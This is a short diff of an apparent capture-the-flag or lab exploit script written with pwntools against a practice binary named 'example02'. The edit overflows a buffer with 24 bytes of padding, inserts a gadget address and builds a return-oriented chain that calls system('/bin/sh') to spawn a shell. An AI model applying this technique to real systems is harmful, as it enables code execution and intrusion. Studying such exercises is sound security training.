@@ -19,9 +19,9 @@ ropchain += p64(0x401158)  # win2
 rop = ROP('./example02')
 binary = ELF('./example02')
 
-rop.call('win2', [next(binary.search(b'/bin/sh\x00'))])
+rop.call('system', [next(binary.search(b'/bin/sh\x00'))])
 ropchain = rop.chain()
 
-p.sendline(b'A' * 24 + ropchain)
+p.sendline(b'A' * 24+ p64(0x0000000000400506) + ropchain)
 
 p.interactive()
